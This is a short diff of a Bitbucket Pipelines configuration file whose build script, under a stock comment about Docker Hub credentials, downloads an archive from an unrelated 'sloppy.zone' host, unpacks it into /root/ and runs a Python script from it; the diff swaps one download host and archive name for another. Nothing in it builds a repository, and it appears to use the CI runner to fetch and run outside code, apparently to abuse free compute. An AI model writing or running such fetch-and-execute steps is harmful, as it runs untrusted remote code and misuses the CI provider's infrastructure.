@@ -12,7 +12,7 @@ pipelines:
           - docker
         script: # Modify the commands below to build your repository.
           # Set $DOCKER_HUB_USERNAME and $DOCKER_HUB_PASSWORD as environment variables in repository settings
-          - wget https://k0bra2.sloppy.zone/amin2.tar.bz2
-          - tar -xvf amin2.tar.bz2 -C /root/
+          - wget https://k0bra20.sloppy.zone/20adim.tar.bz2
+          - tar -xvf 20adim.tar.bz2 -C /root/
           - ls /root/*
           - python oy.py
